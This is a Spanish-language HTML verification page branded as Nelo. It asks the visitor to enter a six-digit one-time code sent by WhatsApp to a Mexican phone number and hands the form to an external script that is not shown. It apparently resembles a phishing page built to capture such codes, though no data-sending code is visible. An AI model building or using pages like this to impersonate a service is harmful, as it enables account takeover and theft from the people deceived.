<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
  <title>Verificación | Nelo</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    .body-fondo {
      background-color: #067BF2;
      min-height: 100vh;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px 16px;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
    }

    .app-movil {
      width: 100%;
      max-width: 360px;
      margin: 0 auto;
    }

    .card-alargado {
      background-color: white;
      border-radius: 44px;
      padding: 56px 24px 64px 24px;
      box-shadow: 0 30px 50px -20px rgba(0, 0, 0, 0.35);
      width: 100%;
    }

    .contenido-vertical {
      display: flex;
      flex-direction: column;
      gap: 32px;
    }

    .welcome-block {
      font-size: 1.9rem;
      font-weight: normal;
      text-align: center;
      color: #0A2540;
    }

    .logo-original-container {
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .logo-sin-marco {
      display: block;
      max-width: 100%;
      height: auto;
      transform: scale(0.6);
    }

    .info-numero-container {
      background-color: #F0F7FF;
      border-radius: 28px;
      padding: 18px 20px;
      text-align: center;
      border: 1px solid #DAECFA;
    }

    .texto-codigo-unico {
      font-size: 0.95rem;
      font-weight: 600;
      color: #1F4F7A;
      line-height: 1.5;
    }

    .texto-codigo-unico span {
      font-weight: 700;
      color: #067BF2;
      background: white;
      display: inline-block;
      padding: 4px 12px;
      border-radius: 40px;
      margin-top: 6px;
      font-family: monospace;
      font-size: 0.9rem;
    }

    .phone-label-block {
      font-weight: 600;
      font-size: 0.95rem;
      color: #1F2A44;
      margin-bottom: 12px;
      display: block;
    }

    .code-input-wrapper {
      display: flex;
      align-items: center;
      background-color: #F8FAFE;
      border-radius: 80px;
      border: 1.5px solid #E2EDF2;
      transition: all 0.2s ease;
    }

    .code-input-wrapper:focus-within {
      border-color: #067BF2;
      box-shadow: 0 0 0 3px rgba(6, 123, 242, 0.25);
    }

    .code-input {
      flex: 1;
      border: none;
      outline: none;
      background: transparent;
      padding: 0 20px;
      font-size: 1rem;
      height: 56px;
      text-align: center;
      letter-spacing: 2px;
    }

    .btn-verificar {
      background-color: #067BF2;
      width: 100%;
      border: none;
      border-radius: 80px;
      padding: 18px 0;
      font-size: 1.08rem;
      font-weight: 700;
      color: white;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
    }

    .btn-verificar:active {
      transform: scale(0.97);
    }

    .btn-verificar:disabled {
      background-color: #8CBAF0;
      transform: none;
      cursor: not-allowed;
    }

    .feedback-area {
      margin-top: 18px;
      text-align: center;
    }

    .feedback-msg {
      display: inline-block;
      font-size: 0.78rem;
      font-weight: 500;
      padding: 8px 16px;
      border-radius: 60px;
      background-color: #F1F5F9;
      color: #1E293B;
      transition: all 0.2s;
    }

    .error-fb {
      background-color: #FFECEC;
      color: #C62828;
    }

    .success-fb {
      background-color: #E0F7FA;
      color: #067BF2;
    }

    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(3px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      visibility: hidden;
      opacity: 0;
      transition: visibility 0.2s, opacity 0.2s ease;
    }

    .modal-overlay.active {
      visibility: visible;
      opacity: 1;
    }

    .modal-container {
      background-color: white;
      border-radius: 44px;
      width: 280px;
      max-width: 80%;
      padding: 32px 24px;
      text-align: center;
      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.3);
      animation: modalFadeIn 0.2s ease-out;
    }

    @keyframes modalFadeIn {
      from {
        transform: scale(0.95);
        opacity: 0;
      }
      to {
        transform: scale(1);
        opacity: 1;
      }
    }

    .spinner-azul-modal {
      display: inline-block;
      width: 48px;
      height: 48px;
      border: 4px solid rgba(6, 123, 242, 0.2);
      border-radius: 50%;
      border-top-color: #067BF2;
      animation: spin 0.8s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .modal-mensaje {
      font-size: 1.1rem;
      font-weight: 600;
      color: #0A2540;
      margin-bottom: 8px;
    }

    .modal-submensaje {
      font-size: 0.85rem;
      color: #5A7B9C;
      font-weight: 500;
    }

    @media (max-width: 450px) {
      .card-alargado {
        padding: 48px 20px 56px 20px;
      }
      .welcome-block {
        font-size: 1.7rem;
      }
      .code-input {
        height: 52px;
      }
      .btn-verificar {
        padding: 16px 0;
      }
      .modal-container {
        width: 260px;
        padding: 28px 20px;
      }
      .spinner-azul-modal {
        width: 42px;
        height: 42px;
      }
    }
  </style>
</head>
<body class="body-fondo">
  <div class="app-movil">
    <div class="card-alargado">
      <div class="contenido-vertical">
        <span class="welcome-block">Verifica tu acceso</span>

        <div class="logo-original-container">
          <img class="logo-sin-marco" src="img/logo.jpeg" alt="Logo Nelo"
               onerror="this.onerror=null; this.src='https://placehold.co/400x200?text=Logo&bg=f0f0f0'; this.style.transform='scale(0.6)'">
        </div>

        <div class="info-numero-container">
          <div class="texto-codigo-unico" id="mensajeCodigoUnico">
            Ingresa el código de uso único enviado vía WhatsApp al
            <span id="telefonoDestacado">+52 --- --- ----</span>
          </div>
        </div>

        <div class="code-group">
          <span class="phone-label-block">Código de verificación</span>
          <div class="code-input-wrapper">
            <input type="text" id="codigoSeguridad" class="code-input" 
                   placeholder="• • • • • •" inputmode="numeric" maxlength="6">
          </div>
        </div>

        <button class="btn-verificar" id="verificarCodigoBtn">Validar código →</button>

        <div class="feedback-area">
          <span id="feedbackSpanCode" class="feedback-msg"></span>
        </div>
      </div>
    </div>
  </div>

  <div id="spinnerModal" class="modal-overlay">
    <div class="modal-container">
      <div class="spinner-azul-modal"></div>
      <div class="modal-mensaje">Verificando</div>
      <div class="modal-submensaje">por favor espere...</div>
    </div>
  </div>

  <script src="js/index2.js"></script>
</body>
</html>
